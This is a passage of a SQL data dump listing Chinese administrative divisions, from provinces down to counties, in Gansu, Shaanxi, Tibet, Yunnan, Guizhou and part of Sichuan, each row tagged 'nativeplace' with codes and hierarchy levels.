县','14510.3','nativeplace',14510,2),(19781,'庆城县','14510.2','nativeplace',14510,2),(19780,'西峰区','14510.1','nativeplace',14510,2),(19779,'庆阳市','14510','nativeplace',14510,1),(19778,'敦煌市','14509.7','nativeplace',14510,2),(19777,'玉门市','14509.6','nativeplace',14510,2),(19776,'阿克塞哈萨克族自治县','14509.5','nativeplace',14510,2),(19775,'肃北蒙古族自治县','14509.4','nativeplace',14509,2),(19774,'安西县','14509.3','nativeplace',14509,2),(19773,'金塔县','14509.2','nativeplace',14509,2),(19772,'肃州区','14509.1','nativeplace',14509,2),(19771,'酒泉市','14509','nativeplace',14509,1),(19770,'静宁县','14508.7','nativeplace',14509,2),(19769,'庄浪县','14508.6','nativeplace',14509,2),(19768,'华亭县','14508.5','nativeplace',14509,2),(19767,'崇信县','14508.4','nativeplace',14508,2),(19766,'灵台县','14508.3','nativeplace',14508,2),(19765,'泾川县','14508.2','nativeplace',14508,2),(19764,'崆峒区','14508.1','nativeplace',14508,2),(19763,'平凉市','14508','nativeplace',14508,1),(19762,'山丹县','14507.6','nativeplace',14508,2),(19761,'高台县','14507.5','nativeplace',14508,2),(19760,'临泽县','14507.4','nativeplace',14507,2),(19759,'民乐县','14507.3','nativeplace',14507,2),(19758,'肃南裕固族自治县','14507.2','nativeplace',14507,2),(19757,'甘州区','14507.1','nativeplace',14507,2),(19756,'张掖市','14507','nativeplace',14507,1),(19755,'天祝藏族自治县','14506.4','nativeplace',14506,2),(19754,'古浪县','14506.3','nativeplace',14506,2),(19753,'民勤县','14506.2','nativeplace',14506,2),(19752,'凉州区','14506.1','nativeplace',14506,2),(19751,'武威市','14506','nativeplace',14506,1),(19750,'张家川回族自治县','14505.7','nativeplace',14506,2),(19749,'武山县','14505.6','nativeplace',14506,2),(19748,'甘谷县','14505.5','nativeplace',14506,2),(19747,'秦安县','14505.4','nativeplace',14505,2),(19746,'清水县','14505.3','nativeplace',14505,2),(19745,'北道区','14505.2','nativeplace',14505,2),(19744,'秦城区','14505.1','nativeplace',14505,2),(19743,'天水市','14505','nativeplace',14505,1),(19742,'景泰县','14504.5','nativeplace',14505,2),(19741,'会宁县','14504.4','nativeplace',14504,2),(19740,'靖远县','14504.3','nativeplace',14504,2),(19739,'平川区','14504.2','nativeplace',14504,2),(19738,'白银区','14504.1','nativeplace',14504,2),(19737,'白银市','14504','nativeplace',14504,1),(19736,'永昌县','14503.2','nativeplace',14503,2),(19735,'金川区','14503.1','nativeplace',14503,2),(19734,'金昌市','14503','nativeplace',14503,1),(19733,'嘉峪关市','14502','nativeplace',14502,1),(19732,'榆中县','14501.8','nativeplace',14502,2),(19731,'皋兰县','14501.7','nativeplace',14502,2),(19730,'永登县','14501.6','nativeplace',14502,2),(19729,'红古区','14501.5','nativeplace',14502,2),(19728,'安宁区','14501.4','nativeplace',14501,2),(19727,'西固区','14501.3','nativeplace',14501,2),(19726,'七里河区','14501.2','nativeplace',14501,2),(19725,'城关区','14501.1','nativeplace',14501,2),(19724,'兰州市','14501','nativeplace',14501,1),(19723,'甘肃省','14500','nativeplace',14500,0),(19722,'柞水县','14010.7','nativeplace',14011,2),(19721,'镇安县','14010.6','nativeplace',14011,2),(19720,'山阳县','14010.5','nativeplace',14011,2),(19719,'商南县','14010.4','nativeplace',14010,2),(19718,'丹凤县','14010.3','nativeplace',14010,2),(19717,'洛南县','14010.2','nativeplace',14010,2),(19716,'商州区','14010.1','nativeplace',14010,2),(19715,'商洛市','14010','nativeplace',14010,1),(19714,'白河县','14009.10','nativeplace',14009,2),(19713,'旬阳县','14009.9','nativeplace',14010,2),(19712,'镇坪县','14009.8','nativeplace',14010,2),(19711,'平利县','14009.7','nativeplace',14010,2),(19710,'岚皋县','14009.6','nativeplace',14010,2),(19709,'紫阳县','14009.5','nativeplace',14010,2),(19708,'宁陕县','14009.4','nativeplace',14009,2),(19707,'石泉县','14009.3','nativeplace',14009,2),(19706,'汉阴县','14009.2','nativeplace',14009,2),(19705,'汉滨区','14009.1','nativeplace',14009,2),(19704,'安康市','14009','nativeplace',14009,1),(19703,'子洲县','14008.12','nativeplace',14008,2),(19702,'清涧县','14008.11','nativeplace',14008,2),(19701,'吴堡县','14008.10','nativeplace',14008,2),(19700,'佳　县','14008.9','nativeplace',14009,2),(19699,'米脂县','14008.8','nativeplace',14009,2),(19698,'绥德县','14008.7','nativeplace',14009,2),(19697,'定边县','14008.6','nativeplace',14009,2),(19696,'靖边县','14008.5','nativeplace',14009,2),(19695,'横山县','14008.4','nativeplace',14008,2),(19694,'府谷县','14008.3','nativeplace',14008,2),(19693,'神木县','14008.2','nativeplace',14008,2),(19692,'榆阳区','14008.1','nativeplace',14008,2),(19691,'榆林市','14008','nativeplace',14008,1),(19690,'佛坪县','14007.11','nativeplace',14007,2),(19689,'留坝县','14007.10','nativeplace',14007,2),(19688,'镇巴县','14007.9','nativeplace',14008,2),(19687,'略阳县','14007.8','nativeplace',14008,2),(19686,'宁强县','14007.7','nativeplace',14008,2),(19685,'勉　县','14007.6','nativeplace',14008,2),(19684,'西乡县','14007.5','nativeplace',14008,2),(19683,'洋　县','14007.4','nativeplace',14007,2),(19682,'城固县','14007.3','nativeplace',14007,2),(19681,'南郑县','14007.2','nativeplace',14007,2),(19680,'汉台区','14007.1','nativeplace',14007,2),(19679,'汉中市','14007','nativeplace',14007,1),(19678,'黄陵县','14006.13','nativeplace',14006,2),(19677,'黄龙县','14006.12','nativeplace',14006,2),(19676,'宜川县','14006.11','nativeplace',14006,2),(19675,'洛川县','14006.10','nativeplace',14006,2),(19674,'富　县','14006.9','nativeplace',14007,2),(19673,'甘泉县','14006.8','nativeplace',14007,2),(19672,'吴旗县','14006.7','nativeplace',14007,2),(19671,'志丹县','14006.6','nativeplace',14007,2),(19670,'安塞县','14006.5','nativeplace',14007,2),(19669,'子长县','14006.4','nativeplace',14006,2),(19668,'延川县','14006.3','nativeplace',14006,2),(19667,'延长县','14006.2','nativeplace',14006,2),(19666,'宝塔区','14006.1','nativeplace',14006,2),(19665,'延安市','14006','nativeplace',14006,1),(19664,'华阴市','14005.11','nativeplace',14005,2),(19663,'韩城市','14005.10','nativeplace',14005,2),(19662,'富平县','14005.9','nativeplace',14006,2),(19661,'白水县','14005.8','nativeplace',14006,2),(19660,'蒲城县','14005.7','nativeplace',14006,2),(19659,'澄城县','14005.6','nativeplace',14006,2),(19658,'合阳县','14005.5','nativeplace',14006,2),(19657,'大荔县','14005.4','nativeplace',14005,2),(19656,'潼关县','14005.3','nativeplace',14005,2),(19655,'华　县','14005.2','nativeplace',14005,2),(19654,'临渭区','14005.1','nativeplace',14005,2),(19653,'渭南市','14005','nativeplace',14005,1),(19652,'兴平市','14004.14','nativeplace',14004,2),(19651,'武功县','14004.13','nativeplace',14004,2),(19650,'淳化县','14004.12','nativeplace',14004,2),(19649,'旬邑县','14004.11','nativeplace',14004,2),(19648,'长武县','14004.10','nativeplace',14004,2),(19647,'彬　县','14004.9','nativeplace',14005,2),(19646,'永寿县','14004.8','nativeplace',14005,2),(19645,'礼泉县','14004.7','nativeplace',14005,2),(19644,'乾　县','14004.6','nativeplace',14005,2),(19643,'泾阳县','14004.5','nativeplace',14005,2),(19642,'三原县','14004.4','nativeplace',14004,2),(19641,'渭城区','14004.3','nativeplace',14004,2),(19640,'杨凌区','14004.2','nativeplace',14004,2),(19639,'秦都区','14004.1','nativeplace',14004,2),(19638,'咸阳市','14004','nativeplace',14004,1),(19637,'太白县','14003.12','nativeplace',14003,2),(19636,'凤　县','14003.11','nativeplace',14003,2),(19635,'麟游县','14003.10','nativeplace',14003,2),(19634,'千阳县','14003.9','nativeplace',14004,2),(19633,'陇　县','14003.8','nativeplace',14004,2),(19632,'眉　县','14003.7','nativeplace',14004,2),(19631,'扶风县','14003.6','nativeplace',14004,2),(19630,'岐山县','14003.5','nativeplace',14004,2),(19629,'凤翔县','14003.4','nativeplace',14003,2),(19628,'陈仓区','14003.3','nativeplace',14003,2),(19627,'金台区','14003.2','nativeplace',14003,2),(19626,'滨区','14003.1','nativeplace',14003,2),(19625,'宝鸡市','14003','nativeplace',14003,1),(19624,'宜君县','14002.4','nativeplace',14002,2),(19623,'耀州区','14002.3','nativeplace',14002,2),(19622,'印台区','14002.2','nativeplace',14002,2),(19621,'王益区','14002.1','nativeplace',14002,2),(19620,'铜川市','14002','nativeplace',14002,1),(19619,'高陵县','14001.13','nativeplace',14001,2),(19618,'户　县','14001.12','nativeplace',14001,2),(19617,'周至县','14001.11','nativeplace',14001,2),(19616,'蓝田县','14001.10','nativeplace',14001,2),(19615,'长安区','14001.9','nativeplace',14002,2),(19614,'临潼区','14001.8','nativeplace',14002,2),(19613,'阎良区','14001.7','nativeplace',14002,2),(19612,'雁塔区','14001.6','nativeplace',14002,2),(19611,'未央区','14001.5','nativeplace',14002,2),(19610,'灞桥区','14001.4','nativeplace',14001,2),(19609,'莲湖区','14001.3','nativeplace',14001,2),(19608,'碑林区','14001.2','nativeplace',14001,2),(19607,'新城区','14001.1','nativeplace',14001,2),(19606,'西安市','14001','nativeplace',14001,1),(19605,'陕西省','14000','nativeplace',14000,0),(19604,'朗　县','13507.7','nativeplace',13508,2),(19603,'察隅县','13507.6','nativeplace',13508,2),(19602,'波密县','13507.5','nativeplace',13508,2),(19601,'墨脱县','13507.4','nativeplace',13507,2),(19600,'米林县','13507.3','nativeplace',13507,2),(19599,'工布江达县','13507.2','nativeplace',13507,2),(19598,'林芝县','13507.1','nativeplace',13507,2),(19597,'林芝地区','13507','nativeplace',13507,1),(19596,'措勤县','13506.7','nativeplace',13507,2),(19595,'改则县','13506.6','nativeplace',13507,2),(19594,'革吉县','13506.5','nativeplace',13507,2),(19593,'日土县','13506.4','nativeplace',13506,2),(19592,'噶尔县','13506.3','nativeplace',13506,2),(19591,'札达县','13506.2','nativeplace',13506,2),(19590,'普兰县','13506.1','nativeplace',13506,2),(19589,'阿里地区','13506','nativeplace',13506,1),(19588,'尼玛县','13505.10','nativeplace',13505,2),(19587,'巴青县','13505.9','nativeplace',13506,2),(19586,'班戈县','13505.8','nativeplace',13506,2),(19585,'索　县','13505.7','nativeplace',13506,2),(19584,'申扎县','13505.6','nativeplace',13506,2),(19583,'安多县','13505.5','nativeplace',13506,2),(19582,'聂荣县','13505.4','nativeplace',13505,2),(19581,'比如县','13505.3','nativeplace',13505,2),(19580,'嘉黎县','13505.2','nativeplace',13505,2),(19579,'那曲县','13505.1','nativeplace',13505,2),(19578,'那曲地区','13505','nativeplace',13505,1),(19577,'岗巴县','13504.18','nativeplace',13504,2),(19576,'萨嘎县','13504.17','nativeplace',13504,2),(19575,'聂拉木县','13504.16','nativeplace',13504,2),(19574,'吉隆县','13504.15','nativeplace',13504,2),(19573,'亚东县','13504.14','nativeplace',13504,2),(19572,'仲巴县','13504.13','nativeplace',13504,2),(19571,'定结县','13504.12','nativeplace',13504,2),(19570,'康马县','13504.11','nativeplace',13504,2),(19569,'仁布县','13504.10','nativeplace',13504,2),(19568,'白朗县','13504.9','nativeplace',13505,2),(19567,'谢通门县','13504.8','nativeplace',13505,2),(19566,'昂仁县','13504.7','nativeplace',13505,2),(19565,'拉孜县','13504.6','nativeplace',13505,2),(19564,'萨迦县','13504.5','nativeplace',13505,2),(19563,'定日县','13504.4','nativeplace',13504,2),(19562,'江孜县','13504.3','nativeplace',13504,2),(19561,'南木林县','13504.2','nativeplace',13504,2),(19560,'日喀则市','13504.1','nativeplace',13504,2),(19559,'日喀则地区','13504','nativeplace',13504,1),(19558,'浪卡子县','13503.12','nativeplace',13503,2),(19557,'错那县','13503.11','nativeplace',13503,2),(19556,'隆子县','13503.10','nativeplace',13503,2),(19555,'加查县','13503.9','nativeplace',13504,2),(19554,'洛扎县','13503.8','nativeplace',13504,2),(19553,'措美县','13503.7','nativeplace',13504,2),(19552,'曲松县','13503.6','nativeplace',13504,2),(19551,'琼结县','13503.5','nativeplace',13504,2),(19550,'桑日县','13503.4','nativeplace',13503,2),(19549,'贡嘎县','13503.3','nativeplace',13503,2),(19548,'扎囊县','13503.2','nativeplace',13503,2),(19547,'乃东县','13503.1','nativeplace',13503,2),(19546,'山南地区','13503','nativeplace',13503,1),(19545,'边坝县','13502.11','nativeplace',13502,2),(19544,'洛隆县','13502.10','nativeplace',13502,2),(19543,'芒康县','13502.9','nativeplace',13503,2),(19542,'左贡县','13502.8','nativeplace',13503,2),(19541,'八宿县','13502.7','nativeplace',13503,2),(19540,'察雅县','13502.6','nativeplace',13503,2),(19539,'丁青县','13502.5','nativeplace',13503,2),(19538,'类乌齐县','13502.4','nativeplace',13502,2),(19537,'贡觉县','13502.3','nativeplace',13502,2),(19536,'江达县','13502.2','nativeplace',13502,2),(19535,'昌都县','13502.1','nativeplace',13502,2),(19534,'昌都地区','13502','nativeplace',13502,1),(19533,'墨竹工卡县','13501.8','nativeplace',13502,2),(19532,'达孜县','13501.7','nativeplace',13502,2),(19531,'堆龙德庆县','13501.6','nativeplace',13502,2),(19530,'曲水县','13501.5','nativeplace',13502,2),(19529,'尼木县','13501.4','nativeplace',13501,2),(19528,'当雄县','13501.3','nativeplace',13501,2),(19527,'林周县','13501.2','nativeplace',13501,2),(19526,'城关区','13501.1','nativeplace',13501,2),(19525,'拉萨市','13501','nativeplace',13501,1),(19524,'西藏自治区','13500','nativeplace',13500,0),(19523,'维西傈僳族自治县','13016.3','nativeplace',13016,2),(19522,'德钦县','13016.2','nativeplace',13016,2),(19521,'香格里拉县','13016.1','nativeplace',13016,2),(19520,'迪庆藏族自治州','13016','nativeplace',13016,1),(19519,'兰坪白族普米族自治县','13015.4','nativeplace',13015,2),(19518,'贡山独龙族怒族自治县','13015.3','nativeplace',13015,2),(19517,'福贡县','13015.2','nativeplace',13015,2),(19516,'泸水县','13015.1','nativeplace',13015,2),(19515,'怒江傈僳族自治州','13015','nativeplace',13015,1),(19514,'陇川县','13014.5','nativeplace',13015,2),(19513,'盈江县','13014.4','nativeplace',13014,2),(19512,'梁河县','13014.3','nativeplace',13014,2),(19511,'潞西市','13014.2','nativeplace',13014,2),(19510,'瑞丽市','13014.1','nativeplace',13014,2),(19509,'德宏傣族景颇族自治州','13014','nativeplace',13014,1),(19508,'鹤庆县','13013.12','nativeplace',13013,2),(19507,'剑川县','13013.11','nativeplace',13013,2),(19506,'洱源县','13013.10','nativeplace',13013,2),(19505,'云龙县','13013.9','nativeplace',13014,2),(19504,'永平县','13013.8','nativeplace',13014,2),(19503,'巍山彝族回族自治县','13013.7','nativeplace',13014,2),(19502,'南涧彝族自治县','13013.6','nativeplace',13014,2),(19501,'弥渡县','13013.5','nativeplace',13014,2),(19500,'宾川县','13013.4','nativeplace',13013,2),(19499,'祥云县','13013.3','nativeplace',13013,2),(19498,'漾濞彝族自治县','13013.2','nativeplace',13013,2),(19497,'大理市','13013.1','nativeplace',13013,2),(19496,'大理白族自治州','13013','nativeplace',13013,1),(19495,'勐腊县','13012.3','nativeplace',13012,2),(19494,'勐海县','13012.2','nativeplace',13012,2),(19493,'景洪市','13012.1','nativeplace',13012,2),(19492,'西双版纳傣族自治州','13012','nativeplace',13012,1),(19491,'富宁县','13011.8','nativeplace',13012,2),(19490,'广南县','13011.7','nativeplace',13012,2),(19489,'丘北县','13011.6','nativeplace',13012,2),(19488,'马关县','13011.5','nativeplace',13012,2),(19487,'麻栗坡县','13011.4','nativeplace',13011,2),(19486,'西畴县','13011.3','nativeplace',13011,2),(19485,'砚山县','13011.2','nativeplace',13011,2),(19484,'文山县','13011.1','nativeplace',13011,2),(19483,'文山壮族苗族自治州','13011','nativeplace',13011,1),(19482,'河口瑶族自治县','13010.12','nativeplace',13010,2),(19481,'绿春县','13010.11','nativeplace',13010,2),(19480,'金平苗族瑶族傣族自治县','13010.10','nativeplace',13010,2),(19479,'元阳县','13010.9','nativeplace',13011,2),(19478,'泸西县','13010.8','nativeplace',13011,2),(19477,'弥勒县','13010.7','nativeplace',13011,2),(19476,'石屏县','13010.6','nativeplace',13011,2),(19475,'建水县','13010.5','nativeplace',13011,2),(19474,'屏边苗族自治县','13010.4','nativeplace',13010,2),(19473,'蒙自县','13010.3','nativeplace',13010,2),(19472,'开远市','13010.2','nativeplace',13010,2),(19471,'个旧市','13010.1','nativeplace',13010,2),(19470,'红河哈尼族彝族自治州','13010','nativeplace',13010,1),(19469,'禄丰县','13009.10','nativeplace',13009,2),(19468,'武定县','13009.9','nativeplace',13010,2),(19467,'元谋县','13009.8','nativeplace',13010,2),(19466,'永仁县','13009.7','nativeplace',13010,2),(19465,'大姚县','13009.6','nativeplace',13010,2),(19464,'姚安县','13009.5','nativeplace',13010,2),(19463,'南华县','13009.4','nativeplace',13009,2),(19462,'牟定县','13009.3','nativeplace',13009,2),(19461,'双柏县','13009.2','nativeplace',13009,2),(19460,'楚雄市','13009.1','nativeplace',13009,2),(19459,'楚雄彝族自治州','13009','nativeplace',13009,1),(19458,'沧源佤族自治县','13008.8','nativeplace',13009,2),(19457,'耿马傣族佤族自治县','13008.7','nativeplace',13009,2),(19456,'双江拉祜族佤族布朗族傣族自治县','13008.6','nativeplace',13009,2),(19455,'镇康县','13008.5','nativeplace',13009,2),(19454,'永德县','13008.4','nativeplace',13008,2),(19453,'云　县','13008.3','nativeplace',13008,2),(19452,'凤庆县','13008.2','nativeplace',13008,2),(19451,'临翔区','13008.1','nativeplace',13008,2),(19450,'临沧市','13008','nativeplace',13008,1),(19449,'西盟佤族自治县','13007.10','nativeplace',13007,2),(19448,'澜沧拉祜族自治县','13007.9','nativeplace',13008,2),(19447,'孟连傣族拉祜族佤族自治县','13007.8','nativeplace',13008,2),(19446,'江城哈尼族彝族自治县','13007.7','nativeplace',13008,2),(19445,'镇沅彝族哈尼族拉祜族自治县','13007.6','nativeplace',13008,2),(19444,'景谷傣族彝族自治县','13007.5','nativeplace',13008,2),(19443,'景东彝族自治县','13007.4','nativeplace',13007,2),(19442,'墨江哈尼族自治县','13007.3','nativeplace',13007,2),(19441,'普洱哈尼族彝族自治县','13007.2','nativeplace',13007,2),(19440,'翠云区','13007.1','nativeplace',13007,2),(19439,'思茅市','13007','nativeplace',13007,1),(19438,'宁蒗彝族自治县','13006.5','nativeplace',13007,2),(19437,'华坪县','13006.4','nativeplace',13006,2),(19436,'永胜县','13006.3','nativeplace',13006,2),(19435,'玉龙纳西族自治县','13006.2','nativeplace',13006,2),(19434,'古城区','13006.1','nativeplace',13006,2),(19433,'丽江市','13006','nativeplace',13006,1),(19432,'水富县','13005.11','nativeplace',13005,2),(19431,'威信县','13005.10','nativeplace',13005,2),(19430,'彝良县','13005.9','nativeplace',13006,2),(19429,'镇雄县','13005.8','nativeplace',13006,2),(19428,'绥江县','13005.7','nativeplace',13006,2),(19427,'永善县','13005.6','nativeplace',13006,2),(19426,'大关县','13005.5','nativeplace',13006,2),(19425,'盐津县','13005.4','nativeplace',13005,2),(19424,'巧家县','13005.3','nativeplace',13005,2),(19423,'鲁甸县','13005.2','nativeplace',13005,2),(19422,'昭阳区','13005.1','nativeplace',13005,2),(19421,'昭通市','13005','nativeplace',13005,1),(19420,'昌宁县','13004.5','nativeplace',13005,2),(19419,'龙陵县','13004.4','nativeplace',13004,2),(19418,'腾冲县','13004.3','nativeplace',13004,2),(19417,'施甸县','13004.2','nativeplace',13004,2),(19416,'隆阳区','13004.1','nativeplace',13004,2),(19415,'保山市','13004','nativeplace',13004,1),(19414,'元江哈尼族彝族傣族自治县','13003.9','nativeplace',13004,2),(19413,'新平彝族傣族自治县','13003.8','nativeplace',13004,2),(19412,'峨山彝族自治县','13003.7','nativeplace',13004,2),(19411,'易门县','13003.6','nativeplace',13004,2),(19410,'华宁县','13003.5','nativeplace',13004,2),(19409,'通海县','13003.4','nativeplace',13003,2),(19408,'澄江县','13003.3','nativeplace',13003,2),(19407,'江川县','13003.2','nativeplace',13003,2),(19406,'红塔区','13003.1','nativeplace',13003,2),(19405,'玉溪市','13003','nativeplace',13003,1),(19404,'宣威市','13002.9','nativeplace',13003,2),(19403,'沾益县','13002.8','nativeplace',13003,2),(19402,'会泽县','13002.7','nativeplace',13003,2),(19401,'富源县','13002.6','nativeplace',13003,2),(19400,'罗平县','13002.5','nativeplace',13003,2),(19399,'师宗县','13002.4','nativeplace',13002,2),(19398,'陆良县','13002.3','nativeplace',13002,2),(19397,'马龙县','13002.2','nativeplace',13002,2),(19396,'麒麟区','13002.1','nativeplace',13002,2),(19395,'曲靖市','13002','nativeplace',13002,1),(19394,'安宁市','13001.14','nativeplace',13001,2),(19393,'寻甸回族彝族自治县','13001.13','nativeplace',13001,2),(19392,'禄劝彝族苗族自治县','13001.12','nativeplace',13001,2),(19391,'嵩明县','13001.11','nativeplace',13001,2),(19390,'石林彝族自治县','13001.10','nativeplace',13001,2),(19389,'宜良县','13001.9','nativeplace',13002,2),(19388,'富民县','13001.8','nativeplace',13002,2),(19387,'晋宁县','13001.7','nativeplace',13002,2),(19386,'呈贡县','13001.6','nativeplace',13002,2),(19385,'东川区','13001.5','nativeplace',13002,2),(19384,'西山区','13001.4','nativeplace',13001,2),(19383,'官渡区','13001.3','nativeplace',13001,2),(19382,'盘龙区','13001.2','nativeplace',13001,2),(19381,'五华区','13001.1','nativeplace',13001,2),(19380,'昆明市','13001','nativeplace',13001,1),(19379,'云南省','13000','nativeplace',13000,0),(19378,'三都水族自治县','12509.12','nativeplace',12509,2),(19377,'惠水县','12509.11','nativeplace',12509,2),(19376,'龙里县','12509.10','nativeplace',12509,2),(19375,'长顺县','12509.9','nativeplace',12510,2),(19374,'罗甸县','12509.8','nativeplace',12510,2),(19373,'平塘县','12509.7','nativeplace',12510,2),(19372,'独山县','12509.6','nativeplace',12510,2),(19371,'瓮安县','12509.5','nativeplace',12510,2),(19370,'贵定县','12509.4','nativeplace',12509,2),(19369,'荔波县','12509.3','nativeplace',12509,2),(19368,'福泉市','12509.2','nativeplace',12509,2),(19367,'都匀市','12509.1','nativeplace',12509,2),(19366,'黔南布依族苗族自治州','12509','nativeplace',12509,1),(19365,'麻江县','12508.15','nativeplace',12508,2),(19364,'雷山县','12508.14','nativeplace',12508,2),(19363,'从江县','12508.13','nativeplace',12508,2),(19362,'榕江县','12508.12','nativeplace',12508,2),(19361,'黎平县','12508.11','nativeplace',12508,2),(19360,'台江县','12508.10','nativeplace',12508,2),(19359,'剑河县','12508.9','nativeplace',12509,2),(19358,'锦屏县','12508.8','nativeplace',12509,2),(19357,'天柱县','12508.7','nativeplace',12509,2),(19356,'岑巩县','12508.6','nativeplace',12509,2),(19355,'镇远县','12508.5','nativeplace',12509,2),(19354,'三穗县','12508.4','nativeplace',12508,2),(19353,'施秉县','12508.3','nativeplace',12508,2),(19352,'黄平县','12508.2','nativeplace',12508,2),(19351,'凯里市','12508.1','nativeplace',12508,2),(19350,'黔东南苗族侗族自治州','12508','nativeplace',12508,1),(19349,'赫章县','12507.8','nativeplace',12508,2),(19348,'威宁彝族回族苗族自治县','12507.7','nativeplace',12508,2),(19347,'纳雍县','12507.6','nativeplace',12508,2),(19346,'织金县','12507.5','nativeplace',12508,2),(19345,'金沙县','12507.4','nativeplace',12507,2),(19344,'黔西县','12507.3','nativeplace',12507,2),(19343,'大方县','12507.2','nativeplace',12507,2),(19342,'毕节市','12507.1','nativeplace',12507,2),(19341,'毕节地区','12507','nativeplace',12507,1),(19340,'安龙县','12506.8','nativeplace',12507,2),(19339,'册亨县','12506.7','nativeplace',12507,2),(19338,'望谟县','12506.6','nativeplace',12507,2),(19337,'贞丰县','12506.5','nativeplace',12507,2),(19336,'晴隆县','12506.4','nativeplace',12506,2),(19335,'普安县','12506.3','nativeplace',12506,2),(19334,'兴仁县','12506.2','nativeplace',12506,2),(19333,'兴义市','12506.1','nativeplace',12506,2),(19332,'黔西南布依族苗族自治州','12506','nativeplace',12506,1),(19331,'万山特区','12505.10','nativeplace',12505,2),(19330,'松桃苗族自治县','12505.9','nativeplace',12506,2),(19329,'沿河土家族自治县','12505.8','nativeplace',12506,2),(19328,'德江县','12505.7','nativeplace',12506,2),(19327,'印江土家族苗族自治县','12505.6','nativeplace',12506,2),(19326,'思南县','12505.5','nativeplace',12506,2),(19325,'石阡县','12505.4','nativeplace',12505,2),(19324,'玉屏侗族自治县','12505.3','nativeplace',12505,2),(19323,'江口县','12505.2','nativeplace',12505,2),(19322,'铜仁市','12505.1','nativeplace',12505,2),(19321,'铜仁地区','12505','nativeplace',12505,1),(19320,'紫云苗族布依族自治县','12504.6','nativeplace',12505,2),(19319,'关岭布依族苗族自治县','12504.5','nativeplace',12505,2),(19318,'镇宁布依族苗族自治县','12504.4','nativeplace',12504,2),(19317,'普定县','12504.3','nativeplace',12504,2),(19316,'平坝县','12504.2','nativeplace',12504,2),(19315,'西秀区','12504.1','nativeplace',12504,2),(19314,'安顺市','12504','nativeplace',12504,1),(19313,'仁怀市','12503.14','nativeplace',12503,2),(19312,'赤水市','12503.13','nativeplace',12503,2),(19311,'习水县','12503.12','nativeplace',12503,2),(19310,'余庆县','12503.11','nativeplace',12503,2),(19309,'湄潭县','12503.10','nativeplace',12503,2),(19308,'凤冈县','12503.9','nativeplace',12504,2),(19307,'务川仡佬族苗族自治县','12503.8','nativeplace',12504,2),(19306,'道真仡佬族苗族自治县','12503.7','nativeplace',12504,2),(19305,'正安县','12503.6','nativeplace',12504,2),(19304,'绥阳县','12503.5','nativeplace',12504,2),(19303,'桐梓县','12503.4','nativeplace',12503,2),(19302,'遵义县','12503.3','nativeplace',12503,2),(19301,'汇川区','12503.2','nativeplace',12503,2),(19300,'红花岗区','12503.1','nativeplace',12503,2),(19299,'遵义市','12503','nativeplace',12503,1),(19298,'盘　县','12502.4','nativeplace',12502,2),(19297,'水城县','12502.3','nativeplace',12502,2),(19296,'六枝特区','12502.2','nativeplace',12502,2),(19295,'钟山区','12502.1','nativeplace',12502,2),(19294,'六盘水市','12502','nativeplace',12502,1),(19293,'清镇市','12501.10','nativeplace',12501,2),(19292,'修文县','12501.9','nativeplace',12502,2),(19291,'息烽县','12501.8','nativeplace',12502,2),(19290,'开阳县','12501.7','nativeplace',12502,2),(19289,'小河区','12501.6','nativeplace',12502,2),(19288,'白云区','12501.5','nativeplace',12502,2),(19287,'乌当区','12501.4','nativeplace',12501,2),(19286,'花溪区','12501.3','nativeplace',12501,2),(19285,'云岩区','12501.2','nativeplace',12501,2),(19284,'南明区','12501.1','nativeplace',12501,2),(19283,'贵阳市','12501','nativeplace',12501,1),(19282,'贵州省','12500','nativeplace',12500,0),(19281,'雷波县','12021.17','nativeplace',12021,2),(19280,'美姑县','12021.16','nativeplace',12021,2),(19279,'甘洛县','12021.15','nativeplace',12021,2),(19278,'越西县','12021.14','nativeplace',12021,2),(19277,'冕宁县','12021.13','nativeplace',12021,2),(19276,'喜德县','12021.12','nativeplace',12021,2),(19275,'昭觉县','12021.11','nativeplace',12021,2),(19274,'金阳县','12021.10','nativeplace',12021,2),(19273,'布拖县','12021.9','nativeplace',12022,2),(19272,'普格县','12021.8','nativeplace',12022,2),(19271,'宁南县','12021.7','nativeplace',12022,2),(19270,'会东县','12021.6','nativeplace',12022,2),(19269,'会理县','12021.5','nativeplace',12022,2),(19268,'德昌县','12021.4','nativeplace',12021,2),(19267,'盐源县','12021.3','nativeplace',12021,2),(19266,'木里藏族自治县','12021.2','nativeplace',12021,2),(19265,'西昌市','12021.1','nativeplace',12021,2),(19264,'凉山彝族自治州','12021','nativeplace',12021,1),(19263,'得荣县','12020.18','nativeplace',12020,2),(19262,'稻城县','12020.17','nativeplace',12020,2),(19261,'乡城县','12020.16','nativeplace',12020,2),(19260,'巴塘县','12020.15','nativeplace',12020,2),(19259,'理塘县','12020.14','nativeplace',12020,2),(19258,'色达县','12020.13','nativeplace',12020,2),(19257,'石渠县','12020.12','nativeplace',12020,2),(19256,'白玉县','12020.11','nativeplace',12020,2),(19255,'德格县','12020.10','nativeplace',12020,2),(19254,'新龙县','12020.9','nativeplace',12021,2),(19253,'甘孜县','12020.8','nativeplace',12021,2),(19252,'炉霍县','12020.7','nativeplace',12021,2),(19251,'道孚县','12020.6','nativeplace',12021,2),(19250,'雅江县','12020.5','nativeplace',12021,2),(19249,'九龙县','12020.4','nativeplace',12020,2),(19248,'丹巴县','12020.3','nativeplace',12020,2),(19247,'泸定县','12020.2','nativeplace',12020,2),(19246,'康定县','12020.1','nativeplace',12020,2),(19245,'甘孜藏族自治州','12020','nativeplace',12020,1),(19244,'红原县','12019.13','nativeplace',12019,2),(19243,'若尔盖县','12019.12','nativeplace',12019,2),(19242,'阿坝县','12019.11','nativeplace',12019,2),(19241,'壤塘县','12019.10','nativeplace',12019,2),(19240,'马尔康县','12019.9','nativeplace',12020,2),(19239,'黑水县','12019.8','nativeplace',12020,2),(19238,'小金县','12019.7','nativeplace',12020,2),(19237,'金川县','12019.6','nativeplace',12020,2),(19236,'九寨沟县','12019.5','nativeplace',12020,2),(19235,'松潘县','12019.4','nativeplace',12019,2),(19234,'茂　县','12019.3','nativeplace',12019,2),(19233,'理　